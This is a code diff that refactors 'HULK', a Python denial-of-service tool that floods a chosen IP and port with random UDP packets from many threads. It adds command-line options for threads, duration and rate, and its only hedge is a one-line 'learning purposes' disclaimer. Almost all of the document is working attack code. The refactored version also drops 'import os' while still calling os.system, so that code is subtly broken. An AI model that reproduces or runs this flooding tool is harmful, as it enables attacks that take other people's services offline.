@@ -1,31 +1,78 @@
-#Lets import modules
-import sys
-import os
-import time
 import socket
-import scapy.all as scapy
 import random
 import threading
-from django.core.validators import URLValidator
-from django.core.exceptions import ValidationError
+import ipaddress
+import time
+import argparse
+import platform
+import logging
 
-validate = URLValidator()
+logging.basicConfig(filename="hulk.log", level=logging.INFO, format="%(asctime)s - %(message)s")
 
-#Lets start coding
-from datetime import datetime
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+def clear_screen():
+    if platform.system() == "Windows":
+        os.system("cls")
+    else:
+        os.system("clear")
 
-#Lets define sock and bytes
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-os.system("clear")
-#Banner :
-print('''
+def validate_ip(ip):
+    try:
+        ipaddress.ip_address(ip)
+        return True
+    except ValueError:
+        print(" ✘ Invalid IP address.")
+        return False
+
+def validate_port(port):
+    try:
+        port = int(port)
+        if 1 <= port <= 65535:
+            return port
+        else:
+            print(" ✘ Port must be between 1 and 65535.")
+            return None
+    except ValueError:
+        print(" ✘ Invalid port number.")
+        return None
+
+class HulkAttack:
+    def __init__(self, ip, port, threads=10, duration=None, rate_limit=None):
+        self.ip = ip
+        self.port = port
+        self.threads = threads
+        self.duration = duration
+        self.rate_limit = rate_limit
+        self.sent = 0
+        self.bytes_data = random._urandom(1490)
+        self.lock = threading.Lock()
+
+    def validate_target(self):
+        return validate_ip(self.ip) and validate_port(self.port)
+
+    def send_packets(self):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        start_time = time.time()
+        while True:
+            if self.duration and (time.time() - start_time) > self.duration:
+                break
+            try:
+                sock.sendto(self.bytes_data, (self.ip, self.port))
+                with self.lock:
+                    self.sent += 1
+                    logging.info(f"Sent packet {self.sent} to {self.ip}:{self.port}")
+                    print(f"[+] Successfully sent {self.sent} packet to {self.ip} through port {self.port}")
+                if self.rate_limit:
+                    time.sleep(1 / self.rate_limit)
+            except socket.error as e:
+                print(f"[-] Network error: {e}")
+                break
+
+    def start(self):
+        if not self.validate_target():
+            print("[-] Invalid target. Exiting...")
+            return
+        clear_screen()
+        print("""
     ************************************************
     *            _  _ _   _ _    _  __             *
     *           | || | | | | |  | |/ /             * 
@@ -36,58 +83,35 @@ print('''
     *          Author: Sumalya Chatterjee          *
     *                                              *
     ************************************************
+    *  [!] Disclaimer: Use for learning purposes   *
     ************************************************
-    *                                              *    
-    *  [!] Disclaimer :                            *
-    *  1. Don't Use For Personal Revenges          *
-    *  2. Author Is Not Responsible For Your Jobs  *
-    *  3. Use for learning purposes                * 
-    *  4. Does HULK suit in villain role, huh?     *
-    ************************************************
-	''')
-#Type your ip and port number (find IP address using nslookup or any online website) 
-ip = input(" [+] Give HULK A Target IP : ")
-port = eval(input(" [+] Starting Port NO : "))
-os.system("clear")
-print('''
-    ************************************************
-    *            _  _ _   _ _    _  __             *
-    *           | || | | | | |  | |/ /             * 
-    *           | __ | |_| | |__| ' <              *
-    *           |_||_|\___/|____|_|\_\             *
-    *                                              *
-    *          HTTP Unbearable Load King           *
-    *          Author: Sumalya Chatterjee          *
-    *                                              *
-    ************************************************
+        """)
+        print(f"[+] HULK is attacking {self.ip} on port {self.port}")
+        logging.info(f"Attack started on {self.ip}:{self.port}")
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=self.send_packets)
+            t.daemon = True
+            threads.append(t)
+            t.start()
+        try:
+            for t in threads:
+                t.join()
+        except KeyboardInterrupt:
+            print("\n[-] Ctrl+C Detected... Stopping attack")
+        print("[-] Attack completed.")
 
-	''')
-try:
-	validate = ip
-	print(" ✅ Valid IP Checked.... ")
-	print(" [+] Attack Screen Loading ....")
-except ValidationError as exception :
-	print(" ✘ Input a right url")
+def main():
+    parser = argparse.ArgumentParser(description="HTTP Unbearable Load King (HULK)")
+    parser.add_argument("--ip", required=True, help="Target IP address")
+    parser.add_argument("--port", type=int, default=80, help="Target port")
+    parser.add_argument("--threads", type=int, default=10, help="Number of threads")
+    parser.add_argument("--duration", type=int, help="Attack duration in seconds")
+    parser.add_argument("--rate", type=int, help="Packets per second")
+    args = parser.parse_args()
 
-#Lets start our attack
-print(" ")
-print("    That's my secret Cap, I am always angry ")
-print(" " )
-print(" [+] HULK is attacking server " + ip )
-print (" " )
-time.sleep(5)
-sent = 0
-try :
- while True:
-		sock.sendto(bytes, (ip, port))
-		sent = sent + 1
-		print("\n [+] Successfully sent %s packet to %s throught port:%s"%(sent,ip,port))
-		if port == 65534:
-			port = 1
-except KeyboardInterrupt:
-	print(" ")
-	print("\n [-] Ctrl+C Detected.........Exiting")
-	print(" [-] DDOS ATTACK STOPPED")
-input(" Enter To Exit")
-os.system("clear")
-print(" [-] Dr. Banner is tired...")
+    attack = HulkAttack(args.ip, args.port, args.threads, args.duration, args.rate)
+    attack.start()
+
+if __name__ == "__main__":
+    main()
